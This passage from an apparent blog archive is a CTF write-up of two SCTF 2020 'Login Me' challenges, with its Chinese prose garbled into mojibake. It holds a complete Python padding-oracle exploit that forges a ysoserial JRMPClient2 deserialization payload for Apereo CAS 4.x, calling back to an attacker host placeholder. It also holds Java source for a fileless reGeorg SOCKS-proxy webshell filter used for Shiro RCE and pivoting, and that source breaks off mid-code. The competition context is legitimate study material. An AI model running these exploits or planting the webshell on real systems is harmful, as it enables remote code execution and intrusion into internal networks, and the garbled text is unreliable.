<li>æ‰¾äºŒé˜¶ååºåˆ—åŒ–ï¼ŒäºŒé˜¶ååºåˆ—åŒ–å¾€å¾€å‡ºç°åœ¨readExternalå¤„ã€‚äºŒé˜¶ååºåˆ—åŒ–ï¼Œæ—¢å¯ä»¥æ˜¯æ ‡å‡†çš„Byteå­—èŠ‚æµå‹ï¼ˆCVE-2016-0638ï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¯jrmpå¸¦å¤–åˆ©ç”¨ï¼ˆCVE-2017-3248ï¼‰ï¼Œè¿˜å¯ä»¥æ˜¯ä¸€äº›å˜ç§æ¯”å¦‚è¿™é‡Œçš„cve-2020-14756å¼€å‘è‡ªå®ç°çš„ååºåˆ—åŒ–ï¼Œç”šè‡³å¯ä»¥æ˜¯å¼€å‘åœ¨ååºåˆ—åŒ–æ—¶ä½¿ç”¨äº†è‡ªå·±ç»§æ‰¿çš„ObjectInputStreamé‡Œé¢ä½†æ˜¯é‡Œé¢é‡å†™readResolveæ–¹æ³•ï¼ˆè¦†ç›–äº†åŸæ¥çš„é»‘åå•æ£€æŸ¥ï¼‰ã€‚</li>
<li>è‡ªåŠ¨åŒ–</li>
</ul>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>SCTF 2020 ä¸¤é“Login Meé¢„æœŸè§£çš„æ ¸å¿ƒæŠ€æœ¯</title>
    <url>/2020/07/17/SCTF-2020-%E4%B8%A4%E9%81%93Login-Me%E9%A2%84%E6%9C%9F%E8%A7%A3%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<!-- more -->
<h2 id="Login-Me-cas-4-x-excution-rceï¼ˆé»‘ç›’ï¼‰"><a href="#Login-Me-cas-4-x-excution-rceï¼ˆé»‘ç›’ï¼‰" class="headerlink" title="Login Me - cas 4.x excution rceï¼ˆé»‘ç›’ï¼‰"></a>Login Me - cas 4.x excution rceï¼ˆé»‘ç›’ï¼‰</h2><p>è¯¦ç»†çš„æ¼æ´åˆ†æå¯ä»¥å‚è€ƒ<a href="https://xz.aliyun.com/t/7032">Apereo CAS 4.X executionå‚æ•°ååºåˆ—åŒ–æ¼æ´åˆ†æ</a>è¿™é‡Œä¸åœ¨èµ˜è¿°ã€‚æ–‡ç« æåˆ°äº†ï¼Œå‰åä¸¤ä¸ªç‰ˆæœ¬åŒºé—´çš„encodeæ–¹æ³•æ˜¯ä¸ä¸€æ ·ã€‚</p>
<p>åœ¨cas4.x-cas.4.1.5ä¸­çš„åŠ å¯†ä¼ªä»£ç å¦‚ä¸‹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">payload = gzip(Java Serialized data)</span><br><span class="line">body = aes128_cbc_encode(key, iv, payload))</span><br><span class="line">header = <span class="string">'\x00\x00\x00\x22\x00\x00\x00\x10'</span>+iv+<span class="string">'\x00\x00\x00\x06'</span>+<span class="string">'aes128'</span></span><br><span class="line">excution = uuid + b64encode(header + body)</span><br></pre></td></tr></table></figure>
<p>CAS 4.1.7 ï½ 4.2.Xçš„åŠ å¯†ä¼ªä»£ç å¦‚ä¸‹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cipher = aes128_cbc_encode(iv + gzip(Java Serialized data))</span><br><span class="line">data = b64encode(cipher)</span><br><span class="line">jwsToken = jws.sign(data, jws_key, algorithm=â€˜HS512â€™)</span><br><span class="line">excution = uuid + b64encode(jwsToken)</span><br></pre></td></tr></table></figure>
<p>å› ä¸ºencodeçš„å˜åŒ–excutionæ˜¯ä¸ä¸€æ ·çš„äº¦å¯ä½œä¸ºåˆ¤æ–­ç‰ˆæœ¬çš„æŒ‡çº¹ã€‚</p>
<ul>
<li>cas4.x-cas.4.1.5ä¹‹å‰ç‰¹å¾ï¼šexecution base64è§£ç å‡ºæ¥ä»¥\x00\x00\x00\x22\x00\x00\x00\x10å¼€å¤´ã€‚</li>
</ul>
<p><img src="1593850236393-8b8d508a-550c-4e7e-b5ea-9c8c1af56877.png#align=left&display=inline&height=224&margin=%5Bobject%20Object%5D&name=image.png&originHeight=291&originWidth=970&size=78900&status=done&style=none&width=746" alt="image.png"></p>
<ul>
<li>4.1.6ä¹‹åç‰¹å¾ï¼šexecutionä¸¤æ¬¡base64è§£ç å‡ºæ¥ä¸æ˜¯ä¹±ç è€Œæ˜¯jwsæ ¼å¼ï¼ˆheader.body.signï¼‰çš„å­—ç¬¦ä¸²ã€‚</li>
</ul>
<p><img src="1593850262798-64d1e785-98a0-4bce-ab72-936f97704d11.png#align=left&display=inline&height=321&margin=%5Bobject%20Object%5D&name=image.png&originHeight=423&originWidth=982&size=105001&status=done&style=none&width=746" alt="image.png"><br>è§£å¯†é¢˜ç›®çš„executionä¸éš¾å‘ç°ï¼Œç¯å¢ƒæ˜¯4.x-4.1.5ã€‚æ­¤å¤–çœ‹åˆ°ï¼Œå‰åä¸¤ä¸ªç‰ˆæœ¬çš„encodeçš„æ–¹å¼å”¯ä¸€çš„å·®å¼‚æ˜¯4.1.6ä¹‹åexecutionçš„éœ€è¦è¿›è¡ŒåŠ å¯†ç­¾åï¼Œè”ç³»åˆ°å®ƒä½¿ç”¨çš„æ˜¯aes/cbcè¯´åˆ°è¿™åº”è¯¥å¾ˆç†Ÿæ‚‰äº†å§padding oracleï¼</p>
<p>è¿™é‡Œpadding oracleï¼Œä»ç„¶éœ€è¦è®²ç©¶æŠ€å·§ï¼Œç›´æ¥ç”Ÿæˆccé“¾ä¸€ç±»çš„payloadè¿›è¡Œpaddingå¤§çº¦éœ€è¦padding 114ç»„å·¦å³æ•°æ®ï¼ˆé¢˜ç›®ä¸¤å°æ—¶é‡å¯ä¸€æ¬¡ï¼Œgadgetè¿˜éœ€è¦fuzzï¼Œè¿™æ˜¯ä¸€ä¸ªéš¾ä»¥å®Œæˆçš„ä»»åŠ¡ï¼‰ï¼Œä½†æ˜¯å¦‚æœç¯å¢ƒèƒ½å‡ºç½‘çš„è¯ç”¨jrmpå°±éœ€è¦padding 14ç»„æ•°æ®å·¦å³äº†ï¼Œè¿™é‡Œè§†ç¯å¢ƒæƒ…å†µä»ç„¶éœ€è¦è·‘1h-3hä¸ç­‰ï¼Œä½†æ˜¯é€šè¿‡çš„åˆ†æè¿‡<a href="http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/">cve-2018-2628</a>ä¹‹åå‘ç°jrmpçš„payloadçš„å¯ä»¥æ›´çŸ­åªéœ€è¦7ç»„ï¼Œæˆ‘åœ¨åŒåŒºåŸŸçš„é˜¿é‡Œäº‘ä¸Šå¤šçº¿ç¨‹è·‘ä¸åˆ°20åˆ†é’Ÿå°±æœ‰äº†ç»“æœï¼ˆè¿™ä¹Ÿæ˜¯é¢˜ç›®æè¿°Time is Flagçš„æš—ç¤º233333ï¼‰ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jose <span class="keyword">import</span> jws</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> cStringIO <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> ThreadPool</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">start_time = time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime())</span><br><span class="line"></span><br><span class="line">iv = uuid.uuid4().bytes</span><br><span class="line">header_mode = <span class="string">'\x00\x00\x00\x22\x00\x00\x00\x10&#123;iv&#125;\x00\x00\x00\x06aes128'</span></span><br><span class="line"></span><br><span class="line">JAR_FILE = <span class="string">'ysoserial-0.0.6-SNAPSHOT-all.jar'</span></span><br><span class="line">URL= <span class="string">"http://ip:port/login"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">"Accept"</span>:<span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,<span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:66.0) Gecko/20100101 Firefox/66.0"</span>,<span class="string">"Connection"</span>:<span class="string">"close"</span>,<span class="string">"Accept-Language"</span>:<span class="string">"en-US,en;q=0.5"</span>,<span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>,<span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span>&#125;</span><br><span class="line"></span><br><span class="line">cookies = &#123;<span class="string">"JSESSIONID"</span>:<span class="string">"ADF6653ED3808BE63B052BCED53494A3"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64Padding</span><span class="params">(data)</span>:</span></span><br><span class="line">	missing_padding = <span class="number">4</span> - len(data) % <span class="number">4</span></span><br><span class="line">	<span class="keyword">if</span> missing_padding <span class="keyword">and</span> missing_padding != <span class="number">4</span>:</span><br><span class="line">		data += <span class="string">'='</span> * missing_padding</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compress</span><span class="params">(data)</span>:</span></span><br><span class="line">	gzip_compress = zlib.compressobj(<span class="number">9</span>, zlib.DEFLATED, zlib.MAX_WBITS | <span class="number">16</span>)</span><br><span class="line">	data = gzip_compress.compress(data) + gzip_compress.flush()</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bitFlippingAttack</span><span class="params">(fake_value, orgin_value)</span>:</span></span><br><span class="line">	iv = []</span><br><span class="line">	<span class="keyword">for</span> f, o <span class="keyword">in</span> zip(fake_value, orgin_value):</span><br><span class="line">		iv.append(chr(ord(f) ^ ord(o)))</span><br><span class="line">	<span class="keyword">return</span> iv</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad_string</span><span class="params">(payload)</span>:</span></span><br><span class="line">	BS = AES.block_size</span><br><span class="line">	pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">	<span class="keyword">return</span> pad(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span><span class="params">(paramsPost,w)</span>:</span></span><br><span class="line">	response = requests.post(URL, data=paramsPost, headers=headers, cookies=cookies, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">	<span class="keyword">return</span> w, response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">paddingOracle</span><span class="params">(value)</span>:</span></span><br><span class="line">	fakeiv = list(chr(<span class="number">0</span>)*<span class="number">16</span>)</span><br><span class="line">	intermediary_value_reverse = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">		num = <span class="number">16</span></span><br><span class="line">		response_result = []</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>-num+<span class="number">1</span>, num):</span><br><span class="line">			jobs = []</span><br><span class="line">			pool = ThreadPool(num)</span><br><span class="line">			<span class="keyword">for</span> w <span class="keyword">in</span> range(j, j + num):</span><br><span class="line">				fakeiv[N<span class="number">-1</span>-i] = chr(w)</span><br><span class="line">				<span class="comment">#print(fakeiv)</span></span><br><span class="line">				fake_iv = <span class="string">''</span>.join(fakeiv)</span><br><span class="line">				paramsPost = &#123;<span class="string">"execution"</span>:<span class="string">"4a538b9e-ecfe-4c95-bcc0-448d0d93f494_"</span> + base64.b64encode(header + body + fake_iv + value),<span class="string">"password"</span>:<span class="string">"admin"</span>,<span class="string">"submit"</span>:<span class="string">"LOGIN"</span>,<span class="string">"_eventId"</span>:<span class="string">"submit"</span>,<span class="string">"lt"</span>:<span class="string">"LT-5-pE3Oo6oDNFQUZDdapssDyN4C749Ga0-cas01.example.org"</span>,<span class="string">"username"</span>:<span class="string">"admin"</span>&#125;</span><br><span class="line">				job = pool.apply_async(send_request, (paramsPost,w))</span><br><span class="line">				jobs.append(job)</span><br><span class="line"></span><br><span class="line">			pool.close()</span><br><span class="line">			pool.join()</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> w <span class="keyword">in</span> jobs:</span><br><span class="line">				j_value, response = w.get()</span><br><span class="line">				<span class="comment">#print(response)</span></span><br><span class="line">				<span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">					print(<span class="string">"="</span>*<span class="number">5</span> + <span class="string">"200"</span> + <span class="string">"="</span>*<span class="number">5</span>)</span><br><span class="line">					response_result.append(j_value)</span><br><span class="line">		print(response_result)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> len(response_result) == <span class="number">1</span>:</span><br><span class="line">			j_value  = response_result[<span class="number">0</span>]</span><br><span class="line">			intermediary_value_reverse.append(chr((i+<span class="number">1</span>) ^ j_value))</span><br><span class="line">			<span class="keyword">for</span> w <span class="keyword">in</span> range(<span class="number">0</span>, i+<span class="number">1</span>):</span><br><span class="line">				<span class="keyword">try</span>:</span><br><span class="line">					fakeiv[N-w<span class="number">-1</span>] = chr(ord(intermediary_value_reverse[w]) ^ (i+<span class="number">2</span>))</span><br><span class="line">				<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">					print(fakeiv, intermediary_value_reverse, w, i+<span class="number">1</span>)</span><br><span class="line">					print(base64.b64encode(value))</span><br><span class="line">					print(e)</span><br><span class="line">					exit()</span><br><span class="line">			print(fakeiv)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			print(response_result)</span><br><span class="line">			print(<span class="string">"Exit Because count of is "</span> + str(len(response_result)))</span><br><span class="line">			exit()</span><br><span class="line">		print(<span class="string">"="</span>*<span class="number">5</span> + <span class="string">"sleep"</span> + <span class="string">"="</span>*<span class="number">5</span>)</span><br><span class="line">		time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	intermediary_value = intermediary_value_reverse[::<span class="number">-1</span>]</span><br><span class="line">	<span class="keyword">return</span> intermediary_value</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad_string</span><span class="params">(payload)</span>:</span></span><br><span class="line">	BS = AES.block_size</span><br><span class="line">	pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">	<span class="keyword">return</span> pad(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, JAR_FILE, <span class="string">'JRMPClient2'</span>, <span class="string">'your_ip:your_port'</span>],stdout=subprocess.PIPE)</span><br><span class="line">	payload = popen.stdout.read()</span><br><span class="line">	payload = pad_string(compress(payload))</span><br><span class="line"></span><br><span class="line">	excution = <span class="string">"input_excution"</span></span><br><span class="line"></span><br><span class="line">	body = base64.b64decode(excution)[<span class="number">34</span>:]</span><br><span class="line">	header = base64.b64decode(excution)[<span class="number">0</span>:<span class="number">34</span>]</span><br><span class="line">	iv = list(header[<span class="number">8</span>:<span class="number">24</span>])</span><br><span class="line"></span><br><span class="line">	N=<span class="number">16</span></span><br><span class="line"></span><br><span class="line">	fake_value_arr = re.findall(<span class="string">r'[\s\S]&#123;16&#125;'</span>, payload)</span><br><span class="line">	fake_value_arr.reverse()</span><br><span class="line"></span><br><span class="line">	value = body[<span class="number">-16</span>:]</span><br><span class="line"></span><br><span class="line">	payload_value_arr = [value]</span><br><span class="line">	</span><br><span class="line">	count = <span class="number">1</span></span><br><span class="line">	all_count = len(fake_value_arr)</span><br><span class="line">	print(all_count)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> fake_value_arr:</span><br><span class="line">		intermediary_value = paddingOracle(value)</span><br><span class="line">		print(value, intermediary_value)</span><br><span class="line">		fakeIv = bitFlippingAttack(intermediary_value, i)</span><br><span class="line">		value = <span class="string">''</span>.join(fakeIv)</span><br><span class="line">		payload_value_arr.append(value)</span><br><span class="line"></span><br><span class="line">		print(count, all_count)</span><br><span class="line">		count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	fakeiv = payload_value_arr.pop()</span><br><span class="line">	payload_value_arr.reverse()</span><br><span class="line"></span><br><span class="line">	payload = header_mode.format(iv=fakeiv) + <span class="string">''</span>.join(payload_value_arr)</span><br><span class="line">	print(base64.b64encode(payload))</span><br><span class="line"></span><br><span class="line">	end_time = time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime())</span><br><span class="line">	print(start_time,end_time)</span><br><span class="line">	f = open(<span class="string">'/tmp/cas.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">	f.write(base64.b64encode(payload))</span><br><span class="line">	f.close()</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡jrmpå‡ºæ¥fuzz gadgetä¹Ÿå¾ˆæ–¹ä¾¿ï¼Œè¿™é‡Œç”¨çš„æ˜¯JDK7u21ï¼ˆåœ¨è‡ªå·±åšçš„æ—¶å€™å‘ç°ç»Ÿä¸€ç«¯å£è¯·æ±‚ä¸€æ¬¡jrmpä¹‹åï¼Œåé¢çš„å†ä¸€æ¬¡è¯·æ±‚ä¼šå˜å¾—å¾ˆæ…¢ï¼Œè¿™é‡Œå¯ä»¥é€‰æ‹©å†è·‘ä¸€ä¸ªç«¯å£å‡ºæ¥äº¤æ›¿ä½¿ç”¨ï¼‰ã€‚æ¥ä¸‹æ¥å°±æ˜¯å¸¸è§çš„è¯»å–æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²æŸ¥ç”¨æˆ·ç™»é™†çš„æ“ä½œäº†ï¼Œåœ¨æ­¤ä¸ç»†è¡¨ã€‚</p>
<h2 id="Login-Me-Again-shiro-rce-amp-amp-shiro-bypass-aclï¼ˆç™½ç›’ï¼‰"><a href="#Login-Me-Again-shiro-rce-amp-amp-shiro-bypass-aclï¼ˆç™½ç›’ï¼‰" class="headerlink" title="Login Me Again - shiro rce &amp;&amp; shiro bypass aclï¼ˆç™½ç›’ï¼‰"></a>Login Me Again - shiro rce &amp;&amp; shiro bypass aclï¼ˆç™½ç›’ï¼‰</h2><p>è¿™é“é¢˜ï¼Œç”±æˆ‘å’Œ@leixiaoåˆä½œå®Œæˆï¼Œå‰åŠéƒ¨åˆ†shiroä¸å‡ºç½‘rceåˆ©ç”¨ç”±leixiaoè´Ÿè´£å®Œæˆï¼ŒååŠéƒ¨åˆ†shiro bvpass acléƒ¨åˆ†ç”±æˆ‘è´Ÿè´£å®Œæˆã€‚<br>å…ˆè´´ä¸€ä¸ªå½“æ—¶æ„æ€è¿™é“é¢˜æ—¶å€™çš„é€Ÿè®°ï¼ˆæœ‰åˆ æ”¹ï¼‰ï¼š</p>
<blockquote>
<p>ç¯å¢ƒï¼šå¤–ç½‘ä¸€ä¸ªæœ‰shiro rceçš„ä¸å‡ºç½‘åº”ç”¨ï¼ˆæ‰“åŒ…æˆjarï¼‰ï¼Œå†…ç½‘æœ‰ä¸€ä¸ªspring+æœ€æ–°ç‰ˆshiroå†™ä¸€ä¸ªåªå…è®¸å›¾çš„ä¸Šä¼ åŠŸèƒ½(æ‰“åŒ…æˆwar)ï¼Œä¸Šä¼ åŠŸèƒ½éœ€è¦ç®¡ç†å‘˜æƒé™ï¼ˆshiroé‰´æƒï¼‰éƒ¨ç½²åœ¨æœ‰ajpæ¼æ´çš„tomcat7ä¸Šã€‚</p>
</blockquote>
<blockquote>
<p>æ”»å‡»æ€è·¯<br>1.é€šè¿‡æ³¨å…¥æœ‰socks5ä»£ç†åŠŸèƒ½çš„webshellä»£ç†åˆ°å†…ç½‘ã€‚<br>2.æ‰¾shiroæ–°çš„æƒé™ç»•è¿‡æ–¹æ³•æˆ–è€…è°·æ­Œæœåˆ°æˆ‘ä¹‹å‰æ‰¾çš„shiro ajpè¶Šæƒï¼š<a href="https://issues.apache.org/jira/browse/SHIRO-760">https://issues.apache.org/jira/browse/SHIRO-760</a>ï¼Œè¶Šæƒä¸Šä¼ æ–‡ä»¶æˆ–è€…ç”¨c0ny1å¸ˆå‚…çš„å§¿åŠ¿ã€‚<br>3.ç”¨ajpæ¼æ´åŒ…å«åˆšæ‰ä¸Šä¼ çš„å›¾ç‰‡rce</p>
</blockquote>
<blockquote>
<p>åˆ©ç”¨éš¾ç‚¹ï¼š1.å¸‚é¢ä¸Šè¿˜æ²¡æœ‰socks5ä»£ç†åŠŸèƒ½çš„æ— æ–‡ä»¶webshellï¼Œéœ€è¦é€‰æ‰‹è‡ªå·±ä»å·²æœ‰çš„jspæ„é€ è½¬æ¢æˆæ— æ–‡ä»¶çš„webshellã€‚2.è‡ªå·±æŒ–è¶Šæƒæˆ–è€…æœåˆ°æˆ‘ä¹‹å‰æäº¤çš„é‚£ä¸ªè¶Šæƒissueæˆ–è€…ç”¨å…¶ä»–åŠæ³•ã€‚3.å¸‚é¢ajpåè®®çš„ä»‹ç»è¾ƒå°‘ï¼Œéœ€è¦é€‰æ‰‹è‡ªå·±ç ”ç©¶å¦‚ä½•ç”¨ajpåè®®ä¸Šä¼ æ–‡ä»¶ã€‚</p>
</blockquote>
<p>ä¸‹é¢å°±ä»åˆ©ç”¨éš¾ç‚¹ï¼Œé€ä¸€è¯´æ˜</p>
<h3 id="æ— æ–‡ä»¶socks5ä»£ç†"><a href="#æ— æ–‡ä»¶socks5ä»£ç†" class="headerlink" title="æ— æ–‡ä»¶socks5ä»£ç†"></a>æ— æ–‡ä»¶socks5ä»£ç†</h3><p>å› ä¸ºè¿™é‡Œæ˜¯shiroï¼Œshiroæœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªfilterï¼Œæ‰€ä»¥å†…å­˜é©¬æœ€å¥½ä¹Ÿææˆfilter(ä¼˜å…ˆçº§æœ€é«˜)ï¼Œå†…å­˜é©¬çš„æ€è·¯å¯ä»¥çœ‹åŸºäº<a href="https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA">Tomcatæ— æ–‡ä»¶Webshellç ”ç©¶</a>ã€‚è‡³äºå…·ä½“filterçš„é€»è¾‘ï¼Œæ”¹ä¸€ä¸‹regå°±å¥½äº†ï¼Œä¸‹é¢è´´ä¸€ä¸‹leixiaoå¸ˆå‚…çš„ä»£ç ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reGeorg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MemReGeorg</span> <span class="keyword">implements</span> <span class="title">javax</span>.<span class="title">servlet</span>.<span class="title">Filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> javax.servlet.http.HttpServletRequest request = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> org.apache.catalina.connector.Response response = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> javax.servlet.http.HttpSession session =<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request1, ServletResponse response1, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest)request1;</span><br><span class="line">        javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse)response1;</span><br><span class="line">        javax.servlet.http.HttpSession session = request.getSession();</span><br><span class="line">        String cmd = request.getHeader(<span class="string">"X-CMD"</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="keyword">null</span>) &#123;</span><br><span class="line">            response.setHeader(<span class="string">"X-STATUS"</span>, <span class="string">"OK"</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd.compareTo(<span class="string">"CONNECT"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    String target = request.getHeader(<span class="string">"X-TARGET"</span>);</span><br><span class="line">                    <span class="keyword">int</span> port = Integer.parseInt(request.getHeader(<span class="string">"X-PORT"</span>));</span><br><span class="line">                    java.nio.channels.SocketChannel socketChannel = java.nio.channels.SocketChannel.open();</span><br><span class="line">                    socketChannel.connect(<span class="keyword">new</span> java.net.InetSocketAddress(target, port));</span><br><span class="line">                    socketChannel.configureBlocking(<span class="keyword">false</span>);</span><br><span class="line">                    session.setAttribute(<span class="string">"socket"</span>, socketChannel);</span><br><span class="line">                    response.setHeader(<span class="string">"X-STATUS"</span>, <span class="string">"OK"</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (java.net.UnknownHostException e) &#123;</span><br><span class="line">                    response.setHeader(<span class="string">"X-ERROR"</span>, e.getMessage());</span><br><span class="line">                    response.setHeader(<span class="string">"X-STATUS"</span>, <span class="string">"FAIL"</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">                    response.setHeader(<span class="string">"X-ERROR"</span>, e.getMessage());</span><br><span class="line">                    response.setHeader(<span class="string">"X-STATUS"</span>, <span class="string">"FAIL"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd.compareTo(<span class="string">"DISCONNECT"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute(<span class="string">"socket"</span>);</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    socketChannel.socket().close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">                session.invalidate();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd.compareTo(<span class="string">"READ"</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute(<span class="string">"socket"</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    java.nio.ByteBuffer buf = java.nio.ByteBuffer.allocate(<span class="number">512</span>);</span><br><span class="line">                    <span class="keyword">int</span> bytesRead = socketChannel.read(buf);</span><br><span class="line">                    ServletOutputStream so = response.getOutputStream();</span><br><span class="line">                    <span class="keyword">while</span> (bytesRead &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                        so.write(buf.array(),<span class="number">0</span>,bytesRead);</span><br><span class="line">                        so.flush();</span><br><span class="line">                        buf.clear();</span><br><span class="line">                        bytesRead = socketChannel.read(buf);</span><br><span class="line">                    &#125;</span><br><span class="line">                    response.setHeader(<span class="string">"X-STATUS"</span>, <span class="string">"OK"</span>);</span><br><span class="line">                    so.flush();</span><br><span class="line">                    so.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    response.setHeader(<span class="string">"X-ERROR"</span>, e.getMessage());</span><br><span class="line">                    response.setHeader(<span class="string">"X-STATUS"</span>, <span class="string">"FAIL"</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd.compareTo(<span class="string">"FORWARD"</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute(<span class="string">"socket"</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">int</span> readlen = request.getContentLength();</span><br><span class="line">                    <span class="keyword">byte</span>[] buff = <span class="keyword">new</span> <span class="keyword">byte</span>[readlen];</span><br><span class="line">                    request.getInputStream().read(buff, <span class="number">0</span>, readlen);</span><br><span class="line">                    java.nio.ByteBuffer buf = java.nio.ByteBuffer.allocate(readlen);</span><br><span class="line">                    buf.clear();</span><br><span class="line">                    buf.put(buff);</span><br><span class="line">                    buf.flip();</span><br><span class="line">                    <span class="keyword">while</span>(buf.hasRemaining()) &#123;</span><br><span class="line">                        socketChannel.write(buf);</span><br><span class="line">                    &#125;</span><br><span class="line">                    response.setHeader(<span 